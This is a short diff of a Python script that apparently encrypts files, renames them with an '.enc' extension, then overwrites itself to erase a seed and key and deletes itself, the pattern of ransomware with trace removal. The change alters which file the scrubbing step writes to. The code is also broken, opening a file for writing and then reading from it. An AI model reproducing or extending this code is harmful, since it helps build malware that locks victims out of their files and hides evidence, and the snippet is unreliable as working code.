@@ -54,7 +54,7 @@ if __name__ == "word.py":
             f.write(encrypt_data_medium(content))
             os.rename(filename, filename + ".enc")
     # remove seed and key value from file
-    with open(filename, "wb") as f:
+    with open(__name__, "wb") as f:
         f.write(f.read().replace(b"8008135", b"NiceTry").replace(KEY, KEY.swapcase()))
     # delete this file
     os.remove(__name__)
